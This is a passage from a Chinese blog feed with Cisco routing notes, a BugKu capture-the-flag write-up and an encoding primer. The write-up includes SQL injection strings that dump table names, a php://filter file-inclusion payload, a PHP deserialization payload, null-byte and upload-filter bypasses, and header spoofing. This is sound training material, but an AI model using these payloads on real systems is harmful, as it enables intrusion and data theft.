出接口/下一跳地址。<br>一般用作网络的出口。</p><p>浮动静态路由：通过修改静态路由的管理实现备份。<br>若存在两条静态路由容易构成负载均衡。浮动静态路由可以做到另一条路由作为另一条的备份。<br>当其中一条路径出现问题，备份路径则生效。</p><p>总结：<br>优点：配置简单、CPU不需要计算路由条目、稳定。<br>缺点：不适用于大型网络、不能适应网络拓扑的变化、消耗网络资源。</p><p><b>动态路由<br>路由器自动形成路由表，自动适应网络拓扑变化。</p><p>RIP:(Routing Information Protocol)<br>特点：<br>1.属于IGP，典型的DV协议(没有拓扑概念)<br>2.基于UDP协议，端口是520 RIP|UDP 502|IP 17<br>3.周期性以广播/组播的方式发送路由更新。<br>4.完整更新，路由表里面的路由条目。<br>5.算法-贝尔曼福特算法：使用跳数坐座位rip的度量值。<br>6.支持等价的负载均衡(去往目的由多个路径，路由metric相同)。<br>7.Rip有两个版本：RIPv1,RIPv2。</p><p>RIPv1:<br>1.有类别的路由协议(不携带子网掩码)<br>2.广播的方式发送路由更新 广播地址:255.255.255.255<br>3.在主类边界自动汇总<br>4.不能支持VLSM(可变长子网掩码)<br>5.不能支持路由认证和打标<br>6.不能支持第三方下一跳次优路径(重分布)<br>7.不支持不连续子网,</p><p>RIPv2:</p><p>router rip 进入到rip进程<br>version 1 选择版本<br>Network 宣告原则：按主类的方式进行宣告。<br>例：network 192.168.1.0 172.16.0.0<br>含义：被network包含的路由器上所有被激活的接口启RIP进程。</p><p><code>show ip protocols</code></p><p>接口所属的网段放进rip的数据库。</p><p><code>show ip rip database</code></p><p>利用辅助地址构建连续子网。<br>一个接口下可以配多个辅助地址。</p><p><code>ip address 地址 掩码 secondary</code></p><p><code>show ip int brief</code></p><p>1，路由器模式详解：<br>Router&gt; 用户模式，通常用来查看统计信息，但不能修改路由器的设置。<br>Router# 特权模式，可以查看并修改路由器的配置，通常在这里运行show命令。<br>Router(config)# 全局模式，在这里修改当前运行配置中的内容。<br>Router(config-if)# 接口模式，用来配置路由器的物理接口和环回接口。<br>Router(config-line)# 控制台接口模式<br>Router(config-subif)#  子接口模式，用来配置在路由器中创建的逻辑接口.<br>Router(config-router)#  路由协议接口模式，在这里配置路由协议，如RIP、OSPF、IGRP等。</p><p>2，登录cisco设备必要的配置：<br>Router&gt;enable  //进入特权模式<br>Router#configure terminal   //进入全局模式<br>Router(config)#hostname R1    //配置路由器的主机名<br>R1(config)#no ip domain-lookup  //关闭动态的域名解析,作用是当我们输入错误命令的时候，路由器会认为这条命令没有错误，它只是一个域名的形式，路由器会进行解析，从而浪费宝贵的时间。<br>R1(config)#line console 0    //进入控制台<br>R1(config-line)#exec-timeout 0 0  //关闭控制台的会话超时，也可用命令no exec-timeout，当长时间不去操作路由器的时候，路由器会自动的终止与我们的对话连接，跳转到非连接状态，此时需要输入enable重新进入特权模式，对我们的操作十分的不方便。<br>R1(config-line)#logging synchronous //关闭日志同步，抑制控制台的提示信息，使得路由器发送的控制台屏幕的消息不会附加到命令行中。</p><p>3，cisco设备的基本配置<br>Router(config)#hostname NGR1  //修改路由器主机名<br>Router#clock set 13:01:01 10 july 2007配置路由器时间：<br>Router#show clock   //查看路由器当前时间<br>Router(config)#enable password cisco //  特权模式的明文密码<br>Router(config)#enable secret cisco  // 特权模式的密文密码<br>Router(config)#service password-encryption<br>//将路由器中所有明文密码变为加密的形式<br>Router#copy running-config startup-config  保存路由器当前配置</p><p>VTY口的配置<br>Router(config)#line vty 0 4<br>Router(config-line)#password [password]<br>Router(config-line)#login<br>Router(config-line)#exit</p><p>配置以太网接口地址<br>Router#conf  t<br>Router(config)#interface E0/0  进入接口<br>Router(config-if)#ip address 192.168.1.1 255.255.255.0  //配置IP地址<br>Router(config-if)#no shutdown  //激活该接口</p><p>配置串行接口（需要配置时钟频率）<br>Router#conf  t<br>Router(config)#interface S0<br>Router(config-if)#clock rate 64000 //DCE 设备配置时钟，DTE设备不用配置。<br>Router(config-if)#ip address 192.168.1.1 255.255.255.0   //配置IP地址<br>Router(config-if)#no shutdown</p><p>4常用的show命令：<br>Router#show running-config     查看路由器运行配置文件<br>Router#show ip interface s0/0    查看接口协议相关信息<br>Router#show ip route     查看路由信息。<br>Router#show version      查看路由器版本<br>Router#show flash:        查看路由器flash<br>Router#show history           查看历史命令记录<br>Router#show arp     查看路由器ARP表<br>Router#show clock    查看路由器的时间设置<br>Router#show ip interface brief     查看接口简要信息<br>Router#show interfaces s0/0     查看接口物理相关信息<br>Router#show users     查看当前所有连接到路由器的用户<br>Router#show session     查看会话记录，经常在终端上使用<br>Router#show controllers s0/0    查看特定接口的硬件信息<br>Router#show ip protocols     查看全局和接口的第三层协议的特定状态<br>Router#show startup-config    查看下次路由器重新加载时将要使用的配置<br>Router#show cdp neighbors    CDP思科发现协议，查看直连的相邻设备及其详细信息。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;CCNP&lt;/h1&gt;
&lt;hr&gt;
&lt;center&gt;&lt;small&gt;2019-3-2&lt;/small&gt;&lt;/center&gt;
&lt;p&gt;GNS&lt;br&gt;
Cisco-packet-tracer&lt;br&gt;
&lt;br&gt;&lt;/p&gt;
&lt;center&gt;&lt;small&gt;华丽的分割线&lt;/small&gt;&lt;/cente</summary>
      
    
    
    
    <category term="Reading" scheme="http://blog.dvkunion.cn/categories/Reading/"/>
    
    
    <category term="计算机网络" scheme="http://blog.dvkunion.cn/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    <category term="思科认证" scheme="http://blog.dvkunion.cn/tags/%E6%80%9D%E7%A7%91%E8%AE%A4%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>BugKu</title>
    <link href="http://blog.dvkunion.cn/2019/02/26/BugKu/"/>
    <id>http://blog.dvkunion.cn/2019/02/26/BugKu/</id>
    <published>2019-02-26T22:20:40.000Z</published>
    <updated>2024-03-18T17:47:44.439Z</updated>
    
    <content type="html"><![CDATA[<h1>BugKu</h1><h3 id="b-0x00-前言-b"><b>0x00- - 前言</b></h3><p>久仰BugKu大名，这里记一下Bugku的题目。</p><h3 id="b-0x01-Web-b"><b>0x01- - Web</b></h3><p><b>01-web2</b></p><p>打开是加速的滑稽js....<br>F12得到key,一样的签到题套路</p><p><b>02-计算器</b></p><p>打开是一个验证码一样的计算图片，但是一般的结果都是两位数以上而输入框只能输入1位。<br>右键审查元素直接修改html属性即可。</p><p><b>03-web基础$_GET</b></p><p>打开是一段源码。<br>要求GET方法获得一个what变量的值为flag。<br>url添加?what=flag即可。</p><p><b>04-web基础$_POST</b></p><p>同上题目，方法变为了POST。<br>上hackbar直接可以拿到flag。</p><p><b>05-矛盾</b></p><p>又是一段php。<br>GET得到num,要求num是非数字(!is_numeric)但是只有num==1才能够输出flag。<br>这里num==1是弱类型，所以我们只要输入一个带有字母且开头为1的字符串即可。</p><p><b>06-web3</b></p><p>打开疯狂js弹窗。<br>两种方式:第一禁用浏览器js,F12即可看到flag的注释。<br>第二直接view-source，看到注释掉的html编码的flag。</p><p><b>07-域名解析</b></p><p>按照题目提示修改host文件(Linux:/etc/hosts Win:C:\windows\system32\drivers\etc)即可。<br>大佬说BP改一下host也可以实现。</p><p><b>08-你必须让他停下</b></p><p>打开题目1s一次自动刷新。<br>同样禁用js手动刷出flag即可。<br>BP抓包后手动GO几次也能获得。</p><p><b>09-本地包含</b></p><p>打开只有一个123,按照题目提示是一个LIF。<br>直接盲猜flag.php即可。。。</p><blockquote><p>p.s:看了一下别人的wp发现原题好像不是这样的，，，给了一个源码...<br>include &quot;flag.php&quot;;<br>$a = @$_REQUEST['hello'];<br>eval( &quot;var_dump($a);&quot;);<br>show_source(__FILE__);</p></blockquote><p><b>10-变量1</b></p><p>这题没做出来，缺少了对php 可变变量的知识。<br>题目是一段源码，提示flag在一个变量中，要求GET一个arg值，arg是一个可变变量。<br>让arg=GLOBALS输出全局变量即可。</p><p><b>11-web5</b></p><p>打开有一个输入框，提示JSfuck，F12查看源码发现隐藏的jsfuck。<br>这里有一个坑点，F12看到的是省略后的代码，无法运行。<br>使用view-source查看源码，得到源码扔console台即可。</p><p><b>12-头等舱</b></p><p>。。。看到带有头、head的东西，直接F12条件反射network。<br>看请求包即可得到flag。</p><p><b>13-网站被黑</b></p><p>这题也搞了很久。。。题目提示是一个很没水平的东西???<br>做的时候因为打开后就没啥提示，没有啥思路。<br>扔扫描器扫去把，直接扫到了一个后台。<br>要输入密码。<br>没提示我上哪弄密码去。。。<br>继续扔工具爆破去吧。<br>得到密码拿到flag...</p><blockquote><p>的确很坑。</p></blockquote><p><b>14-管理员系统</b></p><p>打开发现是一个登录窗口，F12发现一个base64注释。解出来是test123。<br>尝试admin登陆，结果有IP限制。<br>改xff即可得到flag。</p><p><b>15-web4</b></p><p>打开提示看看源码，F12启动。<br>看到一串js，都是%扔url解一下。<br>得到的是一个js函数。<br>有一个坑点，注意p1和p2的拼接部分插入了一段，所以密码应该是p1的结尾+插入部分+p2开头。</p><p><b>16-flag在index里</b></p><p>打开是一个触发连接。由题目提示flag在index里面，应该是让我们去查看index.php的内容。<br>点击click之后发现跳转的url是明显的符合LFI漏洞的形式。我们尝试去查看index.php但是没有显示出来。<br>尝试使用php://filter封装成base64进行查看。</p><p><code>?file=php://filter/read=convert.base64-encode/resource=index.php</code></p><p>直接base64解码得到flag。<br>这里一开始用的是php://input。查看到源码之后发现被过滤掉了input和../以及tp、data等关键词。</p><p><b>17-输入密码查看flag</b></p><p>打开提示是一个5位数字的密码。直接bp爆破。</p><p><b>18-点击100万次</b></p><p>这题做了一次又忘了...<br>有关js的题目也是没有条件反射。<br>点开是一个饼干...要你点击100万次就会得出flag。<br>F12 可以看到饼干计数的js代码。<br>js在计数的时候如果计数到了100万就会发出post请求。我们直接伪造这个请求即可。<br>得到flag。</p><p><b>19-备份是个好习惯</b></p><p>提示有备份。扫描扫出index.php.bak。<br>查看源码，要求得到key1和key2不相同但md5相同。md5判断处为弱类型，0e绕过。<br>有一个坑点，这里他使用str_replace把key替换成了空字符串。因此需要使用url编码进行绕过。</p><p><b>20-成绩单</b></p><p>打开发现一个输入框，输入id查询成绩。<br>fuzz发现存在sql注入漏洞。<br>走流程注入：<br><code>1' order by 4 #</code>检测表单长度<br><code>-1' union select 1,2,3,4 #</code>查看元素位置<br><code>-1' union select 1,database(),user(),version() #</code>获取主要信息<br><code>-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),user(),version() #</code>得到表名<br><code>-1' union select 1,(select * from fl4g),user(),version() #</code>直接查询表名得到flag。</p><blockquote><p>回数据库继续熟悉那张特殊的表</p></blockquote><p><b>21-秋名山老司机</b></p><p>打开提示要求在2s内计算一个长串的表达式。<br>python写个eval脚本即可。<br>动手写一下吧...不然一直眼高手低。<br>。。。这么个东西也写了15多分钟。。。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://123.206.87.240:8002/qiumingshan/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">r = s.get(url)</span><br><span class="line">express=r.text</span><br><span class="line">express=express[<span class="number">159</span>:]</span><br><span class="line">rexp=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> express:</span><br><span class="line"><span class="keyword">if</span> i == <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">rexp=rexp+i</span><br><span class="line"><span class="built_in">print</span>(rexp)</span><br><span class="line">ans=<span class="built_in">eval</span>(rexp)</span><br><span class="line">r=s.post(url,data=&#123;<span class="string">&#x27;value&#x27;</span>:ans&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p><b>22-速度要快</b></p><p>打开页面，抓包发现回复内容内包含flag字段，并且源码带有注释掉的提示:要求post一个margin的值。<br>对flag解码两次base64可以得到后面的几个数字，应该就是margin。<br>但是算出来了之后???要求我快点?<br>行吧...这个页面刷新一次就会更新一次那个flag的值...<br>正好趁着热乎...把上面的py代码在熟练一次吧。<br>注意requests必须使用session请求保持会话连接。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">&#x27;http://123.206.87.240:8002/web6/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">r = s.get(url)</span><br><span class="line">exp=r.headers[<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line">exp=exp[<span class="number">44</span>:]</span><br><span class="line">exp=base64.b64decode(exp)</span><br><span class="line">exp=base64.b64decode(exp)</span><br><span class="line">exp=exp.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">r=s.post(url,data=&#123;<span class="string">&#x27;margin&#x27;</span>:exp&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><blockquote><p>ok,我的字符串操作是真的烂...</p></blockquote><p><b>23-cookies欺骗</b></p><p>打开发现url参数filename存在一个base64的加密。解码为key.txt。是一串不</p><p><b>24-never give up</b></p><p>打开看到url参数以为是注入题目...结果没有反馈sql又不会了...<br>日常F12，得到提示。1p.html转向Bugku的论坛。<br>抓包看一下，发现是一个304 modified。<br>删去转304的请求语句If-Modified得到页面的源码，是一段js的代码。<br>里面有一个很长的变量word。并且在 outword()函数中进行了url解码。<br>手动url解码，得到另一段代码，是实现跳转的js以及注释掉的base64。<br>手动base64解码，又得到了一段php代码....<br>做到这里就想起来怎么做的了。。。这里很坑。<br>看到了一个flag的txt文档，试着访问一下就直接能够得到flag...<br>如果按照实际来做php审计的话，需要绕过下面几个函数：<br>stripos(字符串a，字符串b) 函数查找字符串b在字符串a中第一次出现的位置（不区分大小写）。</p><p>file_get_contents 将整个文件读入一个字符串</p><p>strlen() 函数返回字符串的长度</p><p>!$_GET[‘id’]并且id==0：令id=%00或者令id=.字符串都可以绕过</p><p>substr() 函数返回字符串的一部分。 substr(string,start,length) ，length参数可选。如  substr($b,0,1)  就是在参数b里面 ，从0开始返回1个长度的字符串</p><p>eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;)    就是判断&quot;1114&quot;这个字符串里面是否有符合&quot;111&quot;.substr($b,0,1)这个规则的</p><p>这里被坑住了。一直在考虑如何寻找一个编码方式能让substr不识别但是eregi识别出来...<br>这里绕过eregi的方式是用%00截断，使得判断eregi(&quot;111&quot;,&quot;1114&quot;)成立。</p><p>payload:hello.php?id=0e123&amp;a=php://input&amp;b=%0023456</p><p><b>25-welcome to bugku</b></p><p>一个经典的题目<br>打开提示我不是bugku的会员....<br>F12得到注释部分的源码提示。<br>按照源码要求一步一步的走吧...<br>第一个变量txt:考察php://input封装。<br>第二个变量file：考察php://filter封装，根据提示查看hint.php源码。<br>hint内存在一个flag的Class。<br>我们再查看index.php的源码...发现file直接被过滤了...所以我们不能直接读到flag.php<br>但是在后面有一个对password的序列化，结合hint内的class的内容，我们可以构造php反序列化payload。<br><code>O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;,s:8:&quot;flag.php&quot;;&#125;</code><br>作为hint.php的参数进行传输。即可得到Flag</p><p>最后放一个payload:<br><code>index.php?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;,s:8:&quot;flag.php&quot;;&#125;</code></p><p><b>26-过狗一句话</b></p><p>这题已经被日掉了。。。不能做了<br>靠着广大网友的wp大概看一下题目。应该是给的一句话木马。传入参数s即可进行命令执行，寻找flag文件即可。</p><p><b>27-字符?正则?</b></p><p><b>28-前女友</b></p><p>...我不知道为什么这题我做了很久...还是后台更新过了...<br>就很不明白为什么一开始眼瞎的看不到F12源码中的一个提示txt连接。。。<br>查看txt得到提示代码...一个弱类型md5比较，加一个数组绕过strcmp函数。。。<br>...为什么第一次做的时候啥都没看到?</p><p><b>29-login1</b><br>提示sql约束攻击...<br>终于在寒假之后对常见的一些sql攻击有了一定的了解...回过来把这题做掉了。<br>按照提示我们使用Sq约束攻击，首先注册一个用户名为 amdin'# 的用户，设置密码后返回登录，在登陆时候使用admin的用户名和注册时候使用的密码。<br>登陆成功即可拿到flag。</p><p><b>30-你从哪里来</b></p><p>打开链接得到提示：我们是从Google来的吗？<br>修改referer得到Flag。<br>坑点：google用的是https协议...</p><p><b>31-md5 collision</b></p><p>这题bugku的意思应该是直接连接到南邮的题目。。。所以少了题目描述。。。<br>去查南邮的题目会发现给了你源码...只要输入等于他给的md5的值的a即可。。。<br>行吧...</p><p><b>32-程序员本地网站</b><br>要求从本地访问，修改x-forwarded-for即可。</p><p><b>33-各种绕过</b><br>php审计。<br>1.首先url编码id=margin<br>2.数组绕过uname和passwd的sha1加密</p><p><b>34-web8</b><br>依旧是php审计。<br>只要get的ac值和fn-php://input封装传输的值相同即可。</p><p><b>35-细心</b></p><p>题目提示变成admin。<br>但是打开看到的是一个404页面...<br>一开始以为是服务器炸了。<br>抓包看一下，没啥收获。<br>没办法，扫去吧。<br>扫到了一个robots.txt，得到提示：resusl.php<br>然后发现了下一步的提示：x参数要和password相同。。。<br>以为是什么骚操作绕过。。。结果直接盲猜x=admin即可。。。</p><p><b>36-求getshell</b><br>按照要求，需要上传一张image的php。<br>一开始以为是上传一句话菜刀...结果回显会默认把上传的文件转变成随机编码的jpg文件...<br>跟着大佬做...bp抓包之后将Content-Type: Multipart/form-data;像这样改成大写...这样可以过waf。<br>然后使用如下的后缀名php2, php3, php4, php5, phps, pht, phtm, phtml（php的别名）...并且将文件的Content-Type修改为image/jpg的格式。<br>即可得到flag。</p><p><b>37-INSERT INTO注入</b></p><p>题目给了源码。源码可以看到两个地方。<br>1:ip的传入值和函数getip()有关，这个函数会将数据包中的HTTP_X_FORWARDED_FOR赋值给ip<br>2:sql执行语句：insert into client_ip (ip) values ('$ip')</p><p><b>38-这是一个神奇的登陆框</b></p><p>熟悉了Sqlmap以后直接这题就跑出来了...工具真香。<br>Post提交的参数中admin_name参数存在注入。<br>直接爆表爆库跑出flag即可...</p><p><b>39-多次</b></p><p><b>40-PHP_encrypt_1</b></p><h3 id="b-0x02-Misc-b"><b>0x02- - Misc</b></h3><p><b>01-签到题</b></p><p>关注公众号即可</p><p><b>02-这是一张单纯的图片</b></p><p>给了张图片。隐写流程走一遍<br>hex打开发现结尾的html编码的Flag</p><p><b>03-隐写</b></p><p>CRC校验出现错误，调节高度位，得到flag</p><p><b>04-telnet</b></p><p>流量分析题，再根据题目提示，联想到Telnet是明文传输。<br>寻找telnet的登录密码。<br>懒得仔细看了...流量也很干净，直接追踪流看到了明文传输的密码得到flag。</p><p><b>05-眼见非实(ISCCCTF)</b></p><p>一个没有后缀名的文件,file查看文件类型也是zip<br>添加后缀名之后发现该压缩文件内有一个无法打开的docx文件<br>hex查文件头发现其实还是一个zip文件(office文档皆压缩)，再次修改文件后缀名...结果什么都没发现。<br>整理思路(查看wp)...<br>思路是对的，，，眼神不好使。。。flag在document里。。。</p><p><b> 06-啊哒</b></p><p>(终于遇到一个走流程的题了...)<br>压缩文件，解压出一个jpg。<br>binwalk 发现压缩包<br>foremost 提取压缩包<br>zip 打开压缩包发现flag.txt有密码<br>zip伪加密 尝试失败<br>crc爆破 22位爆破难度过高<br>整理思路(继续查看wp)...<br>行吧，还得去看图片的详细信息...得到一串奇怪的字符串<br>bp转一下ascii hex 得到解密密码。<br>拿到flag...</p><p><b>07-又一张图片，还单纯吗</b></p><p>(这次的确是一个走流程的题目了...)<br>jpg图片，直接formost即可得到flag...</p><p><b>08-猜</b></p><p>图片是一个缺了半张脸的女人，要求的flag是这个女人的名字的全拼写。<br>社工题，搜吧。<br>很容易搜到了相关连接。</p><p><b>09-宽带信息泄露</b></p><p>这个根据上一次安恒赛的一道题学习到的一个可以查看宽带备份文件密码的工具。<br>上工具读出来文件，找用户名即可。<br>文件仔细读一读救出来了。</p><p><b>10-隐写2</b></p><p>这次我记住了，这么嚣张的图片先从最简单的地方开始查起<br>文件属性直接看到hint:网络安全工作室在哪?<br>不知道，继续走流程<br>binwalk :发现zip<br>foremost :得到zip<br>然后得到 ：flag.rar和又一个提示文件。<br>提示文件说了三个人物和hint:斗地主。<br>...没猜出来(看了大佬的想法...键盘上的kqj分别对应键盘上的871...)<br>得到第三章图片,hex找到了flag。<br>提交出现问题，发下内部是base64加密，扔bp编码一下，得到真正的flag。</p><p><b>11-多种方法解决</b></p><p>提示我们去找二维码。<br>HEX发现提示：图片格式的base64加密的二维码<br>保存扫描一下得到flag。</p><p><b>12-闪的好快</b></p><p>一个闪烁的gif二维码，使用gif切割工具，<br>18张图片...一个图一个字母...<br>慢慢扫吧。</p><p><b>13-come_game</b></p><p><b>14-白哥的鸽子</b></p><p>一个jpg文件，先看一下图片是啥<br>是一只鸽子。。。</p><p><b>15-Linux</b></p><p>提示都是Linux了，先扔file看一下。<br>linux etx3文件，./无法执行。<br>尝试cat 一下直接拿到了flag。</p><p><b>16-隐写3</b></p><p><b>就五层你能解开嘛</b><br>提示很到位，一共五关。<br>第一关:crc32碰撞。.py脚本跑一下。得到解压密码:进入到了第二层。<br>第二关：维吉尼亚密码。</p><h3 id="b-0x03-Misc-b"><b>0x03- - Misc</b></h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;BugKu&lt;/h1&gt;
&lt;h3 id=&quot;b-0x00-前言-b&quot;&gt;&lt;b&gt;0x00- - 前言&lt;/b&gt;&lt;/h3&gt;
&lt;p&gt;久仰BugKu大名，这里记一下Bugku的题目。&lt;/p&gt;
&lt;h3 id=&quot;b-0x01-Web-b&quot;&gt;&lt;b&gt;0x01- - Web&lt;/b&gt;&lt;/h3&gt;
&lt;p&gt;</summary>
      
    
    
    
    <category term="CTF" scheme="http://blog.dvkunion.cn/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://blog.dvkunion.cn/tags/CTF/"/>
    
    <category term="WP" scheme="http://blog.dvkunion.cn/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>再也没有看不懂的编码！</title>
    <link href="http://blog.dvkunion.cn/2019/02/17/%E5%86%8D%E4%B9%9F%E6%B2%A1%E6%9C%89%E7%9C%8B%E4%B8%8D%E6%87%82%E7%9A%84%E7%BC%96%E7%A0%81!/"/>
    <id>http://blog.dvkunion.cn/2019/02/17/%E5%86%8D%E4%B9%9F%E6%B2%A1%E6%9C%89%E7%9C%8B%E4%B8%8D%E6%87%82%E7%9A%84%E7%BC%96%E7%A0%81!/</id>
    <published>2019-02-17T22:40:52.000Z</published>
    <updated>2024-03-18T17:47:44.439Z</updated>
    
    <content type="html"><![CDATA[<h1>再也没有看不懂的编码！</h1><p><i>2018-12-22</i></p><!-- split --><p>这一阵子做的比赛突然感觉，自己基础真的是太差了。月赛的base32码硬生生以为是base64，这才反应过来看到编码就直接扔一波工具解码碰大运，错了乱码就解不开了。其实对于编码的内容和性质、一般的形式等等跟不讲不出什么所以然来。吃了这次的亏以后，决定重新一点一点一步一步的从最基本的东西开始积累，不要在急着做一些表面的东西。</p><span id="more"></span><p><i>2019/2/17</i></p><p>终于把这篇文章算是更新完结了。<br>揣摩了大佬的编码讲解文章，修改和增添了一些内容。<br>在未来遇到更多的编码时会不断的向这其中添加。</p><hr><h2 id="b-0x00-简介-b"><b>0x00- - 简介</b></h2><p>什么是编码?区分编码和加密以及hash在于,编码只是信息的转换，其目的不在于隐蔽消息的内容，而在于方便传输以及保证传输数据内容不失真等。重点在转换为方便计算机传输的二进制数据。<br>所以个人认为，编码处理后的信息，仍可以视为是明文传输。</p><p>列一下目录：</p><ul><li><b><a href="#0x01">normal decode</a></b><ul><li>ASCII</li><li>Unicode</li><li>UTF-8</li><li>url</li><li>html编码</li></ul></li><li><b><a href="#0x02">base</a></b><ul><li>base64</li><li>base32</li><li>base16</li><li>(extends)UTF-7</li><li>Quoted-printable</li><li>uuencode/uudecode</li><li>XXencoding</li></ul></li><li><b><a href="#0x03">js decode</a></b><ul><li>aaencode</li><li>jjencode</li><li>jsfuck</li><li>社会主义核心价值观编码</li></ul></li><li><b><a href="#0x04">others</a></b><ul><li>正则表达式</li><li>Morse code</li><li>盲文编码</li><li>垃圾邮件兰格密码</li></ul></li></ul><h2 id="b-id-0x01-0x01-normal-decode-b"><b id="0x01">0x01- - normal decode</b></h2><p>这一部分写一些最最最耳熟能详的编码格式。</p><h3 id="font-color-LightSkyBlue-ascii码-font"><font color = "LightSkyBlue">ascii码</font></h3><p><b>定义</b><br>不知道 ASCII 码是不是最早意义上的编码，这种编码的出现是为了解决计算机使用二进制来进行运算和存储所有的数据。为了使用二进制来表示我们生活中所使用的字符(abcd)或是罗马数字，美国有关的标准化组织就出台了 ASCII 编码，统一规定了上述常用符号用哪些二进制数来表示。</p><p><b>编码方式</b><br>ASCII 码通常使用 7bit / 8bit 来表示一个字符。二进制所表示的十进制在这个表中一一对应即可...</p><p><a href="https://imgchr.com/i/kyH7t0"><img src="https://blog.dvkunion.cn/img/kyH7t0.md.jpg" alt="kyH7t0.md.jpg"></a></p><blockquote><p>小结</p><ul><li>1.标准ascii码是7bit+1bit补零。所以在标准的ascii码中只有127个字符</li><li>2.数字部分48-57,大写字母65-90,小写字母96到122</li></ul></blockquote><h3 id="font-color-LightSkyBlue-Unicode-font-br"><font color = "LightSkyBlue">Unicode</font><br></h3><p><b>定义</b><br>在ascii码出现之后，各个国家为了适应自己国家语言分分独立研发的编码体制。如GB2312,来弥(mi)补ascii码的不足。出现了非常混乱的编码现象。因此Unicode应情而生。<br>Unicode也叫统一码，万国码。满足了跨语言、跨平台进行文本转换、处理的要求。1990年开始研发，1994年正式公布。</p><p><b>编码方式</b><br>Unicode统一使用两个字节表示一个字符，对于英文只需要把高字节填零即可。这样既能表示了英文也可以表示中文。因此对于英文的Unicode编码就是明文本身(大写会变为小写)。</p><p><a href="http://www.bejson.com/convert/unicode_chinese/">Unicode在线转换工具</a></p><h3 id="font-color-LightSkyBlue-UTF-8-font-br"><font color = "LightSkyBlue">UTF-8</font><br></h3><p><b>定义</b><br>看了Unicode编码后，很容易发现这样的编码一下子就把存储量翻了一个倍。对于英文来说，浪费了大量的存储空间。于是又产生了UTF-8编码。<br>UTF-8就是在Unicode的编码上，对Unicode进行分组处理。</p><p><b>编码方式</b></p><p>处理方式如下表：</p><table><thead><tr><th><b>Unicode编码(十六进制)</b></th><th><b>UTF-8 字节流(二进制)</b></th></tr></thead><tbody><tr><td>000000-00007F</td><td>0xxxxxxx</td></tr><tr><td>000080-0007FF</td><td>110xxxxx 10xxxxxx</td></tr><tr><td>000800-00FFFF</td><td>1110xxxx 10xxxxxx 10xxxxxx</td></tr><tr><td>010000-10FFFF</td><td>11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</td></tr></tbody></table><p>对不同Unicode编码段进行不同字节的编码处理。节省了大量的空间。</p><p>例：Unicode编码0x20C30在0x010000-0x10FFFF之间，使用4字节模板：11110xxx 10xxxxxx 10xxxxxx 10xxxxxx。将0x20C30写成21位二进制数字（不足21位就在前面补0）：0 0010 0000 1100 0011 0000，用这个比特流依次代替模板中的x，得到：11110000 10100000 10110000 10110000，即F0 A0 B0 B0。<br>同样的还存在UTF-16、UTF-32，但是只有UTF-8才兼容ASCII码</p><h3 id="font-color-LightSkyBlue-Url编码-font-br"><font color = "LightSkyBlue">Url编码</font><br></h3><p>对于url编码，是因为对于url有许多歧义的符号。如：'&amp;'、'=' 等。<br>我们依旧从定义开始了解。</p><p><b>定义</b></p><p>讲到底，到底什么是url。不知道，继续找度娘：<br>url(Uniform/Universal Resource Locator)是统一资源定位符，对可以从互联网上得到的资源的位置和访问方法的一种简洁的表示，是互联网上标准资源的地址。互联网上的每个文件都有一个唯一的URL，它包含的信息指出文件的位置以及浏览器应该怎么处理它。<br>它最初是由蒂姆·伯纳斯·李发明用来作为万维网的地址。现在它已经被万维网联盟编制为互联网标准RFC1738了。（来源百度百科）</p><p>P.S.又发现了一个和这个东西很像的一个玩意，叫做URI，那么在简单地写一下什么是URI吧。</p><p>URI:(Uniform Resource Identifier)统一资源标识符，URI 属于 URL 更低层次的抽象，一种字符串文本标准。就是说，URI 属于父类，而 URL 属于 URI 的子类。URL 是 URI 的一个子集。</p><p>URL的格式如下：协议：<a href="//%E7%94%A8%E6%88%B7%E5%90%8D:%E5%AF%86%E7%A0%81@xn--eqrt2grvd.xn--eqrt2g.xn--eqrt2g7w0ccuv">//用户名:密码@子域名.域名.顶级域名</a>:端口号/目录/文件名.文件后缀?参数=值#标志。<br>（标准化一下）：scheme://host[:port#]/path/.../[;url-params][?query-string][#anchor]</p><p>依旧举个例子比较好理解：例如我的一篇博客的地址：<br><a href="https://blog.dvkunion.cn/2018/10/17/python3-learning%E2%91%A0/">https://blog.dvkunion.cn/2018/10/17/python3-learning①/</a></p><p>它的第一部分--scheme：协议/模式，在上例中就是指 'https://' 部分<br>第二部分--authority：IP/域名+端口号，在上例中就是指 '<a href="http://dvkunion.github.io">dvkunion.github.io</a>' 部分，端口号被省略，默认为80端口。<br>第三部分--path：路径，在上例中就是指 '/2018/10/17/....' 部分，指访问的主机目录。<br>可能后面还会带有？(query)和一些参数(fragment),基本结构就是这样。</p><p>根据文档规定，URL中只允许出现 大小写字母(a-z)&amp;(A-Z)、数字(0-9)、'-'、'_'、'~'、'·' 这些符号。<br>保留字符有：! * ' ( ) ; : @ &amp; = + $ , / ? # [ ]<br>不安全字符：空格、引号、尖括号、#、%、{}|^[]`~之类。</p><p><b>编码方式<b></p><p>URL也称为 